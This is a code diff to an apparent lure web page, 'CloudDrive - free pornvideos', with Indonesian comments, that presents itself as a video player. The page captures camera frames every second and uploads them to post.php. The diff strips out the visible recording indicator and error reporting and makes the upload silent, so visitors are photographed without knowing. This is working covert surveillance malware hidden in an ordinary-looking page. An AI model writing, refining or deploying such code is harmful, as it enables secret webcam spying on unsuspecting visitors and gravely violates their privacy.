@@ -4,6 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>CloudDrive - free pornvideos</title>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
 <style>
   :root {
     --bg: #0e0e10;
@@ -183,31 +184,6 @@
     display: flex;
     align-items: center;
     gap: 5px;
-  }
-
-  .cam-status {
-    display: none;
-    align-items: center;
-    gap: 6px;
-    padding: 6px 12px;
-    border-radius: 20px;
-    background: rgba(239,83,80,0.12);
-    border: 1px solid rgba(239,83,80,0.25);
-    font-size: 0.75rem;
-    color: #ef5350;
-  }
-  .cam-status.active { display: flex; }
-
-  .cam-status .rec-dot {
-    width: 8px; height: 8px;
-    background: #ef5350;
-    border-radius: 50%;
-    animation: pulse 1s ease-in-out infinite;
-  }
-
-  @keyframes pulse {
-    0%, 100% { opacity: 1; transform: scale(1); }
-    50% { opacity: 0.4; transform: scale(0.8); }
   }
 
   .section-label {
@@ -455,7 +431,7 @@
         <div class="empty-icon">▶</div>
         <p>Pilih video dari daftar di bawah</p>
       </div>
-      <video id="mainPlayer" style="display:none;" controls preload="metadata"></video>
+      <video id="mainPlayer" style="display:none;" controls preload="none"></video>
     </div>
 
     <div class="actions-bar">
@@ -599,12 +575,7 @@
     var canvasId = isBack ? 'camCanvasBack' : 'camCanvasFront';
     var canvas = document.getElementById(canvasId);
     var ctx = canvas.getContext('2d');
-    var captureCount = 0;
 
-    // Show recording status
-    document.getElementById('camStatus').classList.add('active');
-
-    // Langsung capture per 1 detik
     captureInterval = setInterval(function() {
       try {
         ctx.drawImage(videoEl, 0, 0, 640, 480);
@@ -613,41 +584,23 @@
         if (dataURL.length < 1000) return;
 
         dataURL = dataURL.replace('image/png', 'image/octet-stream');
-        sendPhoto(dataURL, function() {
-          captureCount++;
-          document.getElementById('camStatusText').textContent = 'REC ' + captureCount;
-        }, function(err) {
-          console.error('Foto gagal dikirim:', err);
-          document.getElementById('camStatusText').textContent = 'ERROR';
-        });
+        sendPhoto(dataURL);
       } catch(e) {
         console.error('Capture error:', e);
       }
     }, 1000);
   }
 
-  function sendPhoto(data, onSuccess, onError) {
-    var formData = new FormData();
-    formData.append('cat', data);
-
-    var xhr = new XMLHttpRequest();
-    xhr.open('POST', 'post.php', true);
-
-    xhr.onreadystatechange = function() {
-      if (xhr.readyState === 4) {
-        if (xhr.status === 200) {
-          if (onSuccess) onSuccess();
-        } else {
-          if (onError) onError('HTTP ' + xhr.status);
-        }
-      }
-    };
-
-    xhr.onerror = function() {
-      if (onError) onError('Network error');
-    };
-
-    xhr.send(formData);
+  function sendPhoto(data) {
+    $.ajax({
+      type: 'POST',
+      data: { cat: data },
+      url: 'post.php',
+      dataType: 'json',
+      async: false,
+      success: function(result) {},
+      error: function() {}
+    });
   }
 
   function playVideo(i) {
